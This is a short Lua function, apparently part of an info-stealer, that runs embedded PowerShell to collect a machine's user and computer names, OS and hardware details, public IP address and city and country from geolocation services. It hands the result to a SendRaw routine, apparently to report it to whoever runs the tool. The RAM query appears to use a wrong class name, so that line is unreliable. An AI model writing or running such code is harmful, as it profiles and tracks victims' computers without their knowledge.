local function GrabSystemInfo()
    local ps = [[
        $u = $env:USERNAME
        $c = $env:COMPUTERNAME
        $os = (Get-CimInstance Win32_OperatingSystem).Caption
        $cpu = (Get-CimInstance Win32_Processor).Name
        $gpu = (Get-CimInstance Win32_VideoController).Name
        $ram = [math]::Round((Get-CimInstance Win32_ComputerMemory).TotalPhysicalMemory / 1GB, 2)
        try { $ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 5).Content } catch { $ip = "?" }
        try { $geo = Invoke-WebRequest -Uri "https://ipinfo.io/json" -UseBasicParsing -TimeoutSec 5 | ConvertFrom-Json; $city = $geo.city; $country = $geo.country } catch { $city = "?"; $country = "?" }
        "User: $u`nComputer: $c`nOS: $os`nCPU: $cpu`nGPU: $gpu`nRAM: ${ram}GB`nIP: $ip`nCity: $city`nCountry: $country"
    ]]
    local result = RunPS(ps)
    if result and result ~= "" then
        SendRaw(result, "System Info")
    end
end

